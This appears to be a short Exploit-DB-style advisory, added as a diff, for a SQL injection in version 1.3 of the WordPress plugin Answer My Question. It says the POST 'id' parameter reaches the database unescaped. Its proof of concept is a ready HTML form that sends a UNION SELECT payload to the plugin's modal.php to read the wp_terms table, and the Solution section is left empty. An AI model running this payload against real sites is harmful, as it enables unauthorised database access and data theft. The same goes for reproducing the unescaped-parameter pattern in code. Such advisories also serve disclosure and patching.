@@ -1,0 +1,31 @@
+# Exploit Title: Answer My Question 1.3 Plugin for WordPress – Sql Injection
+# Date: 10/11/2016
+# Exploit Author: Lenon Leite
+# Vendor Homepage: https://wordpress.org/plugins/answer-my-question/
+# Software Link: https://wordpress.org/plugins/answer-my-question/
+# Contact: http://twitter.com/lenonleite
+# Website: http://lenonleite.com.br/
+# Category: webapps
+# Version: 1.3
+# Tested on: Windows 8.1
+
+1 - Description
+
+$_POST['id'] is not escaped. Url is accessible for any user.
+
+http://lenonleite.com.br/en/blog/2016/11/11/answer-my-question-1-3-plugin-for-wordpress-sql-injection/
+
+2 - Proof of Concept
+
+<form method="post" action="http://localhost:1406/wp/wp-content/plugins/answer-my-question/modal.php">
+    <input type="text" name="id" value="0 UNION SELECT 1,2,3,4,5,6,slug,term_group,name,10,11,12 FROM wp_terms WHERE term_id=1">
+    <input type="submit" value="Send">
+</form>
+
+3. Solution
+
+
+-- 
+Atenciosamente
+
+Lenon Leite
